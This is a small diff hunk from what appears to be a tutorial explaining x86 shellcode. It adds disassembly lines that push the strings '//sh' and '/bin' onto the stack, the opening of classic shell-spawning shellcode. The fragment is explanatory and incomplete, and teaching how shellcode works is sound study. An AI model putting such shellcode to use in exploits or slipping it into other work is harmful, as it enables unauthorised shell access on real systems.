@@ -219,4 +219,5 @@ What does it mean:
 	08048060 <_start>:
 	 8048060: 31 c0                 xor    %eax,%eax
 	 8048062: 50                    push   %eax
-	 8048063: 68 2f 2f 73 68    
+	 8048063: 68 2f 2f 73 68        push   $0x68732f2f	;'//sh'
+	 8048068: 68 2f 62 69 6e        push   $0x6e69622f	;
